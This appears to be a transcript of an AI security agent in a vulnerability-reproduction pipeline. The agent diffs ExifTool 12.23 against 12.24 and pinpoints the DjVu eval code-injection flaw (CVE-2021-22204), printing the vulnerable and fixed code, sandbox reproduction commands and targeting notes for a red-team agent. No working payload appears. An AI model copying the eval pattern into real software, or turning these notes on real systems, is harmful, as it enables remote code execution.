-                    X3F PS PDF ICC VRD DR4 JP2 EXIF AI AIT IND MOV EXV FLIF);
+                    X3F PS PDF ICC VRD DR4 JP2 JXL EXIF AI AIT IND MOV EXV FLIF);
 my %writeTypes; # lookup for writable file types (hash filled if required)
 
 # file extensions that we can't write for various base types
 %noWriteFile = (
     TIFF => [ qw(3FR DCR K25 KDC SRF) ],
     XMP  => [ qw(SVG INX) ],
-    JP2  => [ qw(J2C JPC JXC) ],
+    JP2  => [ qw(J2C JPC) ],
     MOV  => [ qw(INSV) ],
 );
 
@@ -292,6 +292,7 @@
     DWF  => ['DWF',  'Autodesk drawing (Design Web Format)'],
     DWG  => ['DWG',  'AutoCAD Drawing'],
     DYLIB=> ['EXE',  'Mach-O Dynamic Link Library'],
+    DXF  => ['DXF',  'AutoCAD Drawing Exchange Format'],
     EIP  => ['ZIP',  'Capture One Enhanced Image Package'],
     EPS  => ['EPS',  'Encapsulated PostScript Format'],
     EPS2 =>  'EPS',
@@ -355,8 +356,7 @@
     JPM  => ['JP2',  'JPEG 2000 compound image'],
     JPX  => ['JP2',  'JPEG 2000 with extensions'],
     JSON => ['JSON', 'JavaScript Object Notation'],
-    JXC  => ['JP2', 'JPEG XL Codestream'], # (JXC = PH invention, not a real extension)
-    JXL  => ['JP2', 'JPEG XL'],
+    JXL  => ['JXL',  'JPEG XL'],
     JXR  => ['TIFF', 'JPEG XR'],
     K25  => ['TIFF', 'Kodak DC25 RAW'],
     KDC  => ['TIFF', 'Kodak Digital Camera RAW'],
@@ -617,6 +617,7 @@
    'DVR-MS' => 'video/x-ms-dvr',
     DWF  => 'model/vnd.dwf',
     DWG  => 'image/vnd.dwg',
+    DXF  => 'application/dxf',
     EIP  => 'application/x-captureone', #(NC)
     EPS  => 'application/postscript',
     ERF  => 'image/x-epson-erf',
@@ -654,7 +655,6 @@
     JPM  => 'image/jpm',
     JPX  => 'image/jpx',
     JSON => 'application/json',
-    JXC  => 'image/x-jxc', #PH (invented)
     JXL  => 'image/jxl', #PH (NC)
     JXR  => 'image/jxr',
     K25  => 'image/x-kodak-k25',
@@ -805,6 +805,7 @@
     DSS  => 'Olympus',
     DWF  => 0,
     DWG  => 0,
+    DXF  => 0,
     EPS  => 'PostScript',
     EXIF => '',
     EXR  => 'OpenEXR',
@@ -880,6 +881,7 @@
     DV   => '\x1f\x07\0[\x3f\xbf]', # (not tested if extension recognized)
     DWF  => '\(DWF V\d',
     DWG  => 'AC10\d{2}\0',
+    DXF  => '\s*0\s+\0?\s*SECTION\s+2\s+HEADER',
     EPS  => '(%!PS|%!Ad|\xc5\xd0\xd3\xc6)',
     EXE  => '(MZ|\xca\xfe\xba\xbe|\xfe\xed\xfa[\xce\xcf]|[\xce\xcf]\xfa\xed\xfe|Joy!peff|\x7fELF|#!\s*/\S*bin/|!<arch>\x0a)',
     EXIF => '(II\x2a\0|MM\0\x2a)',
@@ -902,9 +904,10 @@
     IND  => '\x06\x06\xed\xf5\xd8\x1d\x46\xe5\xbd\x31\xef\xe7\xfe\x74\xb7\x1d',
   # ISO  =>  signature is at byte 32768
     ITC  => '.{4}itch',
-    JP2  => '(\0\0\0\x0cjP(  |\x1a\x1a)\x0d\x0a\x87\x0a|\xff\x4f\xff\x51\0|\xff\x0a|\0\0\0\x0cJXL \x0d\x0a......ftypjxl )',
+    JP2  => '(\0\0\0\x0cjP(  |\x1a\x1a)\x0d\x0a\x87\x0a|\xff\x4f\xff\x51\0)',
     JPEG => '\xff\xd8\xff',
     JSON => '(\xef\xbb\xbf)?\s*(\[\s*)?\{\s*"[^"]*"\s*:',
+    JXL  => '\xff\x0a|\0\0\0\x0cJXL \x0d\x0a......ftypjxl ',
     LFP  => '\x89LFP\x0d\x0a\x1a\x0a',
     LNK  => '.{4}\x01\x14\x02\0{5}\xc0\0{6}\x46',
     LRI  => 'LELR \0',

diff -u -r -N exiftool-12.23/lib/Image/ExifTool.pod exiftool-12.24/lib/Image/ExifTool.pod
--- exiftool-12.23/lib/Image/ExifTool.pod	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/lib/Image/ExifTool.pod	2021-04-13 15:11:46.000000000 +0000
@@ -441,9 +441,10 @@
 
 =item BlockExtract
 
-Flag to extract some directories (mentioned in the Tag Name documentation)
-as a block.  Setting this to a value of 2 also prevents parsing the block to
-extract tags contained within.
+Flag to extract some directories (mentioned in the
+L<ExifTool tag name documentation|Image::ExifTool::TagNames>) as a block. 
+Setting this to a value of 2 also prevents parsing the block to extract tags
+contained within.
 
 =item ByteOrder

diff -u -r -N exiftool-12.23/perl-Image-ExifTool.spec exiftool-12.24/perl-Image-ExifTool.spec
--- exiftool-12.23/perl-Image-ExifTool.spec	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/perl-Image-ExifTool.spec	2021-04-13 15:11:46.000000000 +0000
@@ -1,6 +1,6 @@
 Summary: perl module for image data extraction
 Name: perl-Image-ExifTool
-Version: 12.23
+Version: 12.24
 Release: 1
 License: Artistic/GPL
 Group: Development/Libraries/Perl

diff -u -r -N exiftool-12.23/t/ExifTool_2.out exiftool-12.24/t/ExifTool_2.out
--- exiftool-12.23/t/ExifTool_2.out	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/t/ExifTool_2.out	2021-04-13 15:11:46.000000000 +0000
@@ -1,9 +1,9 @@
-[ExifTool, ExifTool, ExifTool] ExifToolVersion - ExifTool Version Number: 12.23
+[ExifTool, ExifTool, ExifTool] ExifToolVersion - ExifTool Version Number: 12.24
 [File, System, Other] FileName - File Name: ExifTool.jpg
 [File, System, Other] Directory - Directory: t/images
 [File, System, Other] FileSize - File Size: 25 KiB
 [File, System, Time] FileModifyDate - File Modification Date/Time: 2021:03:19 14:14:12-04:00
-[File, System, Time] FileAccessDate - File Access Date/Time: 2021:04:01 13:20:48-04:00
+[File, System, Time] FileAccessDate - File Access Date/Time: 2021:04:12 12:43:44-04:00
 [File, System, Time] FileInodeChangeDate - File Inode Change Date/Time: 2021:03:19 14:31:48-04:00
 [File, System, Other] FilePermissions - File Permissions: -rw-r--r--
 [File, File, Other] FileType - File Type: JPEG
@@ -259,20 +259,26 @@
 [APP11, JPEG-HDR, Image] bet - Beta: 1.000000
 [APP11, JPEG-HDR, Image] cor - Correction Method: 0
 [APP11, JPEG-HDR, Preview] RatioImage - Ratio Image: (Binary data 19 bytes)
-[JUMBF, JUMBF, Image] type - JUMBF Type: cacb-0011-0010-800000aa00389b71
-[JUMBF, JUMBF, Image] label - JUMBF Label: cai
-[JUMBF, JUMBF, Image] type - JUMBF Type: cast-0011-0010-800000aa00389b71
-[JUMBF, JUMBF, Image] label - JUMBF Label: cb.reuters_1
-[JUMBF, JUMBF, Image] type - JUMBF Type: caas-0011-0010-800000aa00389b71
-[JUMBF, JUMBF, Image] label - JUMBF Label: cai.assertions
-[JUMBF, JUMBF, Image] type - JUMBF Type: json-0011-0010-800000aa00389b71
-[JUMBF, JUMBF, Image] label - JUMBF Label: adobe.asset.info
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: cacb-0011-0010-800000aa00389b71
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable, Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: cai
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: cast-0011-0010-800000aa00389b71
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable, Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: cb.reuters_1
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: caas-0011-0010-800000aa00389b71
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable, Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: cai.assertions
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: json-0011-0010-800000aa00389b71
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable, Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: adobe.asset.info
 [JUMBF, JSON, Other] title - Title: HEALTHCORONAVIRUSUSAOREGON_SALEM_08.jpg
-[JUMBF, JUMBF, Image] type - JUMBF Type: json-0011-0010-800000aa00389b71
-[JUMBF, JUMBF, Image] label - JUMBF Label: cai.location.broad
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: json-0011-0010-800000aa00389b71
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable, Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: cai.location.broad
 [JUMBF, JSON, Other] location - Location: Salem, Oregon
-[JUMBF, JUMBF, Image] type - JUMBF Type: json-0011-0010-800000aa00389b71
-[JUMBF, JUMBF, Image] label - JUMBF Label: cai.rights
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: json-0011-0010-800000aa00389b71
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable, Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: cai.rights
 [JUMBF, JSON, Other] copyright - Copyright: Alisha Jucevic
 [APP12, PictureInfo, Time] TimeDate - Date/Time Original: 1998:12:31 15:17:20
 [APP12, PictureInfo, Image] Shutter - Exposure Time: 1/155

diff -u -r -N exiftool-12.23/t/ExifTool_29.out exiftool-12.24/t/ExifTool_29.out
--- exiftool-12.23/t/ExifTool_29.out	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/t/ExifTool_29.out	2021-04-13 15:11:46.000000000 +0000
@@ -258,20 +258,26 @@
 [APP11, JPEG-HDR, Image] bet - Beta: #.######
 [APP11, JPEG-HDR, Image] cor - Correction Method: #
 [APP11, JPEG-HDR, Preview] RatioImage - Ratio Image: (Binary data 19 bytes)
-[JUMBF, JUMBF, Image] type - JUMBF Type: cacb-####-####-######aa#####b##
-[JUMBF, JUMBF, Image] label - JUMBF Label: cai
-[JUMBF, JUMBF, Image] type - JUMBF Type: cast-####-####-######aa#####b##
-[JUMBF, JUMBF, Image] label - JUMBF Label: cb.reuters_#
-[JUMBF, JUMBF, Image] type - JUMBF Type: caas-####-####-######aa#####b##
-[JUMBF, JUMBF, Image] label - JUMBF Label: cai.assertions
-[JUMBF, JUMBF, Image] type - JUMBF Type: json-####-####-######aa#####b##
-[JUMBF, JUMBF, Image] label - JUMBF Label: adobe.asset.info
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: cacb-####-####-######aa#####b##
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable,_Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: cai
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: cast-####-####-######aa#####b##
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable,_Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: cb.reuters_#
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: caas-####-####-######aa#####b##
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable,_Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: cai.assertions
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: json-####-####-######aa#####b##
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable,_Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: adobe.asset.info
 [JUMBF, JSON, Other] title - Title: HEALTHCORONAVIRUSUSAOREGON_SALEM_##.jpg
-[JUMBF, JUMBF, Image] type - JUMBF Type: json-####-####-######aa#####b##
-[JUMBF, JUMBF, Image] label - JUMBF Label: cai.location.broad
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: json-####-####-######aa#####b##
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable,_Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: cai.location.broad
 [JUMBF, JSON, Other] location - Location: Salem,_Oregon
-[JUMBF, JUMBF, Image] type - JUMBF Type: json-####-####-######aa#####b##
-[JUMBF, JUMBF, Image] label - JUMBF Label: cai.rights
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: json-####-####-######aa#####b##
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable,_Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: cai.rights
 [JUMBF, JSON, Other] copyright - Copyright: Alisha_Jucevic
 [APP12, PictureInfo, Time] TimeDate - Date/Time Original: ####:##:##_##:##:##
 [APP12, PictureInfo, Image] Shutter - Exposure Time: #/###

diff -u -r -N exiftool-12.23/t/Writer_51.out exiftool-12.24/t/Writer_51.out
--- exiftool-12.23/t/Writer_51.out	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/t/Writer_51.out	2021-04-13 15:11:46.000000000 +0000
@@ -1,10 +1,10 @@
-[ExifTool, ExifTool, ExifTool] ExifToolVersion - ExifTool Version Number: 12.23
+[ExifTool, ExifTool, ExifTool] ExifToolVersion - ExifTool Version Number: 12.24
 [File, System, Other] FileName - File Name: Writer_51_failed.jpg
 [File, System, Other] Directory - Directory: t
 [File, System, Other] FileSize - File Size: 25 KiB
-[File, System, Time] FileModifyDate - File Modification Date/Time: 2021:04:01 13:21:08-04:00
-[File, System, Time] FileAccessDate - File Access Date/Time: 2021:04:01 13:21:08-04:00
-[File, System, Time] FileInodeChangeDate - File Inode Change Date/Time: 2021:04:01 13:21:08-04:00
+[File, System, Time] FileModifyDate - File Modification Date/Time: 2021:04:12 12:44:05-04:00
+[File, System, Time] FileAccessDate - File Access Date/Time: 2021:04:12 12:44:05-04:00
+[File, System, Time] FileInodeChangeDate - File Inode Change Date/Time: 2021:04:12 12:44:05-04:00
 [File, System, Other] FilePermissions - File Permissions: -rw-r--r--
 [File, File, Other] FileType - File Type: JPEG
 [File, File, Other] FileTypeExtension - File Type Extension: jpg
@@ -246,20 +246,26 @@
 [APP11, JPEG-HDR, Image] bet - Beta: 1.000000
 [APP11, JPEG-HDR, Image] cor - Correction Method: 0
 [APP11, JPEG-HDR, Preview] RatioImage - Ratio Image: (Binary data 19 bytes)
-[JUMBF, JUMBF, Image] type - JUMBF Type: cacb-0011-0010-800000aa00389b71
-[JUMBF, JUMBF, Image] label - JUMBF Label: cai
-[JUMBF, JUMBF, Image] type - JUMBF Type: cast-0011-0010-800000aa00389b71
-[JUMBF, JUMBF, Image] label - JUMBF Label: cb.reuters_1
-[JUMBF, JUMBF, Image] type - JUMBF Type: caas-0011-0010-800000aa00389b71
-[JUMBF, JUMBF, Image] label - JUMBF Label: cai.assertions
-[JUMBF, JUMBF, Image] type - JUMBF Type: json-0011-0010-800000aa00389b71
-[JUMBF, JUMBF, Image] label - JUMBF Label: adobe.asset.info
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: cacb-0011-0010-800000aa00389b71
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable, Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: cai
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: cast-0011-0010-800000aa00389b71
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable, Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: cb.reuters_1
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: caas-0011-0010-800000aa00389b71
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable, Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: cai.assertions
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: json-0011-0010-800000aa00389b71
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable, Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: adobe.asset.info
 [JUMBF, JSON, Other] title - Title: HEALTHCORONAVIRUSUSAOREGON_SALEM_08.jpg
-[JUMBF, JUMBF, Image] type - JUMBF Type: json-0011-0010-800000aa00389b71
-[JUMBF, JUMBF, Image] label - JUMBF Label: cai.location.broad
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: json-0011-0010-800000aa00389b71
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable, Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: cai.location.broad
 [JUMBF, JSON, Other] location - Location: Salem, Oregon
-[JUMBF, JUMBF, Image] type - JUMBF Type: json-0011-0010-800000aa00389b71
-[JUMBF, JUMBF, Image] label - JUMBF Label: cai.rights
+[JUMBF, JUMBF, Image] jumd-type - JUMD Type: json-0011-0010-800000aa00389b71
+[JUMBF, JUMBF, Image] jumd-flags - JUMD Flags: Requestable, Label
+[JUMBF, JUMBF, Image] jumd-label - JUMD Label: cai.rights
 [JUMBF, JSON, Other] copyright - Copyright: Alisha Jucevic
 [APP12, PictureInfo, Time] TimeDate - Date/Time Original: 1998:12:31 15:17:20
 [APP12, PictureInfo, Image] Shutter - Exposure Time: 1/155

diff -u -r -N exiftool-12.23/windows_exiftool exiftool-12.24/windows_exiftool
--- exiftool-12.23/windows_exiftool	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/windows_exiftool	2021-04-13 15:11:46.000000000 +0000
@@ -10,7 +10,7 @@
 use strict;
 require 5.004;
 
-my $version = '12.23';
+my $version = '12.24';
 
 # add our 'lib' directory to the include list BEFORE 'use Image::ExifTool'
 my $exeDir;
@@ -5417,7 +5417,7 @@
 
          produces output like this:
 
-             -- Generated by ExifTool 12.23 --
+             -- Generated by ExifTool 12.24 --
              File: a.jpg - 2003:10:31 15:44:19
              (f/5.6, 1/60s, ISO 100)
              File: b.jpg - 2006:05:23 11:57:38
</diff>

[4]============================Tool Call (Code Analyst)============================
set_shared_memory(key='versions_map', value='Found versions in /codebase: exiftool-12.23, exiftool-12.24. By rule, the lowest semantic version (12.23) is treated as vulnerable. The latest non-vulnerable (baseline) is 12.24.', override=False)

[4]===========================Tool Output (Code Analyst)===========================
Successfully set value for key "versions_map".

[5]============================Tool Call (Code Analyst)============================
set_shared_memory(key='diff_summary', value='Key security-relevant diff exiftool-12.23 -> 12.24:\n- lib/Image/ExifTool/DjVu.pm (1.06 -> 1.07): Patched security vulnerability in DjVu reader. Old code used eval qq{"$tok"} on tokens parsed from DjVu ANT annotations after a partial escaping of $ and @, enabling arbitrary Perl evaluation from file-controlled strings. New code removes eval and manually maps only a limited set of C escape sequences (a,b,f,n,r,t,\\",\\\\). This addresses CVE-2021-22204 (RCE via DjVu).\n  • Vulnerable line (12.23):\n    $tok =~ s{\\\\(.)|([\\$\\@]|\\\\$)}{\'\\\\\'.($2 || $1)}sge; $tok = eval qq{"$tok"};\n  • Fixed (12.24):\n    my %esc=(...); $tok =~ s/\\\\(.)/$esc{$1}||\'\\\\\'.$1/egs;\n- lib/Image/ExifTool/Jpeg2000.pm: Expanded experimental JPEG XL (JXL) read/write handling, added JUMBF JUMD fields parsing (jumd-type/label/flags/id/sig). Not a security fix but touches file parsing/writing paths.\n- lib/Image/ExifTool.pm: Recognize AutoCAD DXF files; add JXL file type and writer support. No direct security concerns.\n- config_files/acdsee.config: Major documentation and conversion rule additions (ValueConv code blocks). Loaded only via -config; no default behavior change.\n- Documentation and tag tables updated (html/, TagLookup.pm, TagNames.pod); version bumps in exiftool and windows_exiftool.\nSummary: 12.23 is vulnerable (DjVu ANT eval), 12.24 patches it by removing eval from untrusted input parsing.', override=False)

[5]===========================Tool Output (Code Analyst)===========================
Successfully set value for key "diff_summary".

[6]============================Tool Call (Code Analyst)============================
set_shared_memory(key='vulnerable_functions', value='File: lib/Image/ExifTool/DjVu.pm (v1.06 in 12.23)\nFunction: ProcessAnt/ParseAnt token handling around quoted string parsing.\nIndicator: Uses eval on file-controlled token after insufficient escaping:\n  $tok = eval qq{"$tok"};\nImpact: Remote code execution when processing malicious DjVu files (CVE-2021-22204).', override=False)

[6]===========================Tool Output (Code Analyst)===========================
Successfully set value for key "vulnerable_functions".

[7]============================Tool Call (Code Analyst)============================
set_shared_memory(key='vulnerable_entrypoints', value='Primary attack surface: CLI tool `exiftool` reading untrusted files.\n- File parsers: DjVu reader (lib/Image/ExifTool/DjVu.pm) in 12.23 allows RCE via crafted ANT metadata in .djvu files.\nTesting commands (in sandbox):\n- To reproduce (12.23): perl exiftool-12.23/exiftool <malicious.djvu>\n- Safe version (12.24): perl exiftool-12.24/exiftool <same.djvu> should not execute payload.\nOther parsers updated (JXL) but not identified as vulnerable.\nNo network listeners; attack via file inputs or embedded DjVu streams in containers that exiftool parses.', override=False)

[7]===========================Tool Output (Code Analyst)===========================
Successfully set value for key "vulnerable_entrypoints".

[8]============================Tool Call (Code Analyst)============================
codebrowser_get_file_content(file='exiftool-12.23/lib/Image/ExifTool/DjVu.pm', offset=200, limit=80)

[8]===========================Tool Output (Code Analyst)===========================
Content of exiftool-12.23/lib/Image/ExifTool/DjVu.pm:

<content>
#        a number of assumptions here!
sub ParseAnt($)
{
    my $dataPt = shift;
    my (@toks, $tok, $more);
    # (the DjVu annotation syntax really sucks, and requires that every
    # single token be parsed in order to properly scan through the items)
Tok: for (;;) {
        # find the next token
        last unless $$dataPt =~ /(\S)/sg;   # get next non-space character
        if ($1 eq '(') {       # start of list
            $tok = ParseAnt($dataPt);
        } elsif ($1 eq ')') {  # end of list
            $more = 1;
            last;
        } elsif ($1 eq '"') {  # quoted string
            $tok = '';
            for (;;) {
                # get string up to the next quotation mark
                # this doesn't work in perl 5.6.2! grrrr
                # last Tok unless $$dataPt =~ /(.*?)"/sg;
                # $tok .= $1;
                my $pos = pos($$dataPt);
                last Tok unless $$dataPt =~ /"/sg;
                $tok .= substr($$dataPt, $pos, pos($$dataPt)-1-$pos);
                # we're good unless quote was escaped by odd number of backslashes
                last unless $tok =~ /(\\+)$/ and length($1) & 0x01;
                $tok .= '"';    # quote is part of the string
            }
            # must protect unescaped "$" and "@" symbols, and "\" at end of string
            $tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
            # convert C escape sequences (allowed in quoted text)
            $tok = eval qq{"$tok"};
        } else {                # key name
            pos($$dataPt) = pos($$dataPt) - 1;
            # allow anything in key but whitespace, braces and double quotes
            # (this is one of those assumptions I mentioned)
            $tok = $$dataPt =~ /([^\s()"]+)/sg ? $1 : undef;
        }
        push @toks, $tok if defined $tok;
    }
    # prevent further parsing unless more after this
    pos($$dataPt) = length $$dataPt unless $more;
    return @toks ? \@toks : undef;
}

#------------------------------------------------------------------------------
# Process DjVu annotation chunk (ANTa or decoded ANTz)
# Inputs: 0) ExifTool object reference, 1) DirInfo reference, 2) tag table ref
# Returns: 1 on success
sub ProcessAnt($$$)
{
    my ($et, $dirInfo, $tagTablePtr) = @_;
    my $dataPt = $$dirInfo{DataPt};

    # quick pre-scan to check for metadata or XMP
    return 1 unless $$dataPt =~ /\(\s*(metadata|xmp)[\s("]/s;

    # parse annotations into a tree structure
    pos($$dataPt) = 0;
    my $toks = ParseAnt($dataPt) or return 0;

    # process annotations individually
    my $ant;
    foreach $ant (@$toks) {
        next unless ref $ant eq 'ARRAY' and @$ant >= 2;
        my $tag = shift @$ant;
        next if ref $tag or not defined $$tagTablePtr{$tag};
        if ($tag eq 'metadata') {
            # ProcessMeta() takes array reference
            $et->HandleTag($tagTablePtr, $tag, $ant);
        } else {
            next if ref $$ant[0];   # only process simple values
            $et->HandleTag($tagTablePtr, $tag, $$ant[0]);
        }
    }
    return 1;
}

#------------------------------------------------------------------------------
</content>

[9]==============================Agent (Code Analyst)==============================
Status: Completed full workspace diff and security review. Shared memory updated with versions_map, diff_summary, vulnerable_functions, and vulnerable_entrypoints.

Version map
- Found versions: exiftool-12.23, exiftool-12.24
- Vulnerable version: 12.23 (lowest semantic version; also implicit from 12.24 “Patched security vulnerability in DjVu reader” note)
- Latest non-vulnerable baseline: 12.24

High-impact security change (root cause)
- File: exiftool-12.23/lib/Image/ExifTool/DjVu.pm (module version 1.06) vs exiftool-12.24/lib/Image/ExifTool/DjVu.pm (1.07)
- Area: ANT (annotations) parser for DjVu files (ParseAnt / ProcessAnt)
- Vulnerable construct (12.23) evaluates file-controlled strings:
  - Code:
    - $tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
    - $tok = eval qq{"$tok"};
  - The parser uses eval on a string constructed from untrusted file input, after only partially escaping $, @, and trailing backslash. This is code injection in Perl evaluation context.
  - Security classification: CWE-94 (Improper Control of Code Generation – Code Injection). Publicly known as ExifTool RCE via DjVu (CVE-2021-22204).
- Fixed construct (12.24): Removed eval; implemented strict escape translation
  - Code:
    - my %esc = ( a => "\a", b => "\b", f => "\f", n => "\n", r => "\r", t => "\t", '"' => '"', '\\' => '\\' );
    - $tok =~ s/\\(.)/$esc{$1}||'\\'.$1/egs;
  - Only a limited set of C-style escapes are decoded; no evaluation of arbitrary code.

Git-style pseudo-diff (security-relevant lines)
- lib/Image/ExifTool/DjVu.pm
  - 12.23 (vulnerable)
    - # must protect unescaped "$" and "@" symbols, and "\" at end of string
    - $tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
    - # convert C escape sequences (allowed in quoted text)
    - $tok = eval qq{"$tok"};
  - 12.24 (fixed)
    - # convert C escape sequences, allowed in quoted text (only a few)
    - my %esc = ( a => "\a", b => "\b", f => "\f", n => "\n", r => "\r", t => "\t", '"' => '"', '\\' => '\\' );
    - $tok =~ s/\\(.)/$esc{$1}||'\\'.$1/egs;

Other notable changes touching parsing/writing surfaces (reviewed)
- lib/Image/ExifTool/Jpeg2000.pm
  - JUMBF JUMD parsing refactor:
    - Tags changed from generic 'type', 'label', 'id', 'signature' to 'jumd-type', 'jumd-label', 'jumd-id', 'jumd-sig' and new 'jumd-flags' with bitmask decoding (Requestable, Label, ID, Signature).
    - Added bounds checks before reading fields (pos/len checks). No obvious new injection path; uses Get8u/Get32u and length validation.
  - JPEG XL (JXL) handling expanded:
    - Now supports detecting JXL codestream vs ISO BMFF container, reading metadata via ProcessJP2 if wrapped, and writing by wrapping raw codestream into ISO BMFF when necessary (with warning).
    - Write path additions: Writer.pl adds JXL to write types; ExifTool.pm adds file-type and mime-type for JXL and detection regex. No dynamic evaluation, uses controlled I/O. Keep in mind: New parser/writer increases attack surface to malformed JXL, but code has bounds checks and uses existing JP2 processor. No specific vulnerability evident in diff.
- config_files/acdsee.config
  - Large expansion: new region conversion logic (MPRegion2ACDSeeRegion, IPTCRegion2ACDSeeRegion, MWGRegion2ACDSeeRegion) with ValueConv Perl code blocks.
  - Only loaded when users pass -config acdsee.config; not auto-executed. While not a default risk, any config file runs embedded Perl as part of ExifTool’s conversion expressions. Treat untrusted config files as code (documented behavior).
- lib/Image/ExifTool.pm
  - New file recognition: AutoCAD DXF; JXL support; updated mime/extension maps. No direct security concerns.
- Documentation/tag tables (html/, TagNames.pod, TagLookup.pm, tests) updated accordingly.
- Changes explicitly note “Patched security vulnerability in DjVu reader” in 12.24 changelog.

Security hotspots summary
- Input parsing:
  - DjVu ANT parsing had eval injection (fixed in 12.24).
  - Expanded JPEG2000/JXL parsing (bounds checks present).
  - JUMBF/JUMD parsing refactor (safe conversions and checks).
- Command/file exec:
  - None in diffs except the removed eval in DjVu.pm.
- Path handling / sandbox escapes / buffer ops:
  - No additions indicating unsafe buffer arithmetic or path traversal.
- Network handlers / web routes / auth/session/crypto/deserialization:
  - Not applicable (ExifTool is a CLI/file parser; no network services here).
- Dependencies/config defaults:
  - acdsee.config adds use Data::Dumper; still opt-in only via -config.
  - No new mandatory dependencies introduced.
- Privilege changes / error handling:
  - No relevant changes.

Likely vulnerable entry points and attack surfaces (12.23)
- Primary: CLI file parsing of malicious DjVu files
  - Attack vector: A crafted .djvu containing ANT annotations that cause the vulnerable eval path in DjVu.pm to execute attacker-controlled payload during parsing.
- Secondary: Any container that embeds DjVu that ExifTool traverses (if supported).
- No listening sockets; this is exploit via file input (email, uploads, archives processed by automation).

Sandbox test guidance
- Confirm versions:
  - perl exiftool-12.23/exiftool -ver    # should print 12.23
  - perl exiftool-12.24/exiftool -ver    # should print 12.24
- Reproduce (requires a malicious DjVu sample):
  - Vulnerable: perl exiftool-12.23/exiftool malicious.djvu
  - Fixed:     perl exiftool-12.24/exiftool malicious.djvu
  - Expectation: 12.23 may execute payload; 12.24 decodes strings without eval and does not execute code.
- Note: The codebase includes no DjVu test images. If you need a PoC, we can craft or import one (requires permission to fetch or create a DjVu with ANT payload). Request if needed.

Indicators for Security Specialist (to coordinate classification and detection)
- Vulnerable function location:
  - File: exiftool-12.23/lib/Image/ExifTool/DjVu.pm
  - Function: ParseAnt; quoted string handling block around conversion of escape sequences
  - Indicator: Presence of eval qq{"$tok"} after partial escaping regex
- CWE mapping: CWE-94 (Code Injection via eval); also related CWE-95 in Perl contexts (Eval Injection)
- Changelog confirms fix in 12.24; recommend detection of ExifTool <= 12.23 handling DjVu files as at-risk.
- Mitigation: Upgrade to 12.24+ or disable DjVu processing; avoid processing untrusted DjVu files; if using ExifTool as part of pipelines (eg, in GitLab or other services), ensure the binary/script is 12.24+.

Context for Red Team Operator (to target and validate)
- Target file format: DjVu (.djvu), ANT annotation blocks (ANTa / ANTz)
- Trigger path: When exiftool reads DjVu, DjVu.pm::ProcessAnt calls ParseAnt then eval applied to quoted strings inside annotations in 12.23
- Payload crafting: The vulnerability historically leveraged Perl eval parsing of a double-quoted string; a crafted escape/interpolation sequence in quoted token could lead to code execution. With 12.24, only \a\b\f\n\r\t\"\\ are honored; everything else is not evaluated. You will need a PoC compatible with 12.23’s eval path.
- Execution command:
  - perl exiftool-12.23/exiftool malicious.djvu
- Success criteria: Arbitrary command execution in the context of the exiftool process (e.g., creating a file on disk).

Additional diffs (selected)
- lib/Image/ExifTool.pm
  - + JXL file type, mime type, detection regex; + DXF recognition
  - + Include JXL in writeTypes; drop JXC pseudo-type from noWriteFile
